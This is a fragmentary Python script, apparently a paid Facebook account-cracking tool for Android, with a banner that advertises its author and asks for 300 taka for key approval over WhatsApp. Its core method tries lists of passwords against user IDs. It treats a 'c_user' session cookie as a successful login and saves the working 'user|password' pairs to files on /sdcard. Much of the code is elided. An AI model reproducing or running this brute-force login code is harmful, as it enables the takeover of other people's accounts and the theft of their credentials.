...
def main_apv():
    ...
    try:
        ...
        tks = 'Hello%20Ar,sir%20Please%20Approved%20My%20Token%20To%20Premium%20% 20% 20%20%20My%20%20Key%20%20:%20'+ak+''+myid+''+imt

        os.system('am start https://wa.me/+8801935665924?text=' + tks)
    ...
    if key1 in r1:
        ...
        print ("         ༄𝐴𝑅᭄•───────────────────────────────────────•༄𝐴𝑁𝑇𝑂᭄")
        print ("             \033[1;94mGIVE ME 300TK FOR APROVAL ANTO")     
        ...
        os.system('am start https://wa.me/+8801972239643?text=' + tks)

logo="""
             \033[1;93m.s5SSSs.  .s    s.  .s5SSSSs. .s5SSSs.  
             \033[1;95mSS.       SS.    SSS          SS. 
             \033[1;93msS    S%S sSs.  S%S    S%S    sS    S%S 
             \033[1;95mSS    S%S SS`S. S%S    S%S    SS    S%S 
             \033[1;93mSSSs. S%S SS `S.S%S    S%S    SS    S%S 
             \033[1;95mSS    S%S SS  `sS%S    S%S    SS    S%S 
             \033[1;93mSS    `:; SS    `:;    `:;    SS    `:; 
             \033[1;95mSS    ;,. SS    ;,.    ;,.    SS    ;,. 
             \033[1;95:;    ;:' :;    ;:'    ;:'    `:;;;;;:' 
        \033[1;92m༄𝐴𝑅᭄•───────────────────────────────────────•༄𝐴𝑁𝑇𝑂᭄
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;95mAUTHOR   : ANTO          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGITHUB   : FOX-AR           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;93mFACEBOOK : ABU RAHIAN ANTO           \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;92mWHATSAPP : +8801972239643     \033[1;93m▇▇
             \033[1;93m▇▇➣       \033[1;91mTHIS TOOL IS PAID          \033[1;93m▇▇
             \033[1;93m▇▇➣    \033[1;94mGIVE ME 300TK FOR APRVAL      \033[1;93m▇▇
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
         \033[1;92m༄𝐴𝑅᭄•───────────────────────────────────────•༄𝐴𝑁𝑇𝑂᭄
""" 
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/ANTO-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/ANTO-CP.txt' % (H, P, str(len(cp))))
...
def R():
			...
			if key in [""]:
				...
				os.system("xdg-https://www.facebook.com/ANTO.THE.GAME.CHANGER")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[ANTO]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [ANTO-ok 🤫] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/ANTO_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/ANTO_CP.txt' , 'a').write('%s\n' % wrt)
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+8801972239643")
...
def yt():
	...
	os.system("xdg-open https://www.facebook.com/ANTO.THE.GAME.CHANGER")
